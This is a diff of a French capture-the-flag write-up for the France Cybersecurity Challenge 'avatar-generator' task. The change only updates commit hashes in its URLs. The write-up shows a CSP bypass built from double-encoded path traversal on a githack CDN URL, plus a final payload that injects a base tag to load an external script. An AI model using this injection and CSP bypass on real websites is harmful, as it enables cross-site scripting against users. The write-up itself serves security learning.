@@ -205,7 +205,7 @@ Je récupère son URL sur ```githack```:
 
 ## Bypass CSP
 Comme vu au dessus, je fais en sorte que l'url commence par l'url de la CSP
-```https://rawcdn.githack.com/caroso1222/notyf/v2.0.1/dist/notyf.min.js/..%252F..%252F..%252F..%252F../Eteckq/avatar/60c45fffab236a7c5f8abcdee043ec21b178dbf5/assets/js/stats.js```
+```https://rawcdn.githack.com/caroso1222/notyf/v2.0.1/dist/notyf.min.js/..%252F..%252F..%252F..%252F../Eteckq/avatar/623eb51970ffec1f984df536757c1689b6c5f36a/assets/js/stats.js```
 
 J'ai utilisé la technique du double encoding pour les ```/``` afin que le navigateur n'interprête pas l'url et l'a re-transforme en l'url d'origine
 
@@ -223,7 +223,7 @@ Avec cette balise, la page va maintenant transformer tous les chemins relatif en
 
 Payload final:
 ```
-https://avatar-generator.france-cybersecurity-challenge.fr/index.php?seed=304704&primary=%23e67e22&secondary=%3C/%3E%3Cbase%20href=https://rawcdn.githack.com/caroso1222/notyf/v2.0.1/dist/notyf.min.js/..%252F..%252F..%252F..%252F../Eteckq/avatar/60c45fffab236a7c5f8abcdee043ec21b178dbf5/%3E#debug
+https://avatar-generator.france-cybersecurity-challenge.fr/index.php?seed=304704&primary=%23e67e22&secondary=%3C/%3E%3Cbase%20href=https://rawcdn.githack.com/caroso1222/notyf/v2.0.1/dist/notyf.min.js/..%252F..%252F..%252F..%252F../Eteckq/avatar/623eb51970ffec1f984df536757c1689b6c5f36a/%3E#debug
 ```
 
 1 seconde après avoir injecté le payload, le script est bien lancé !
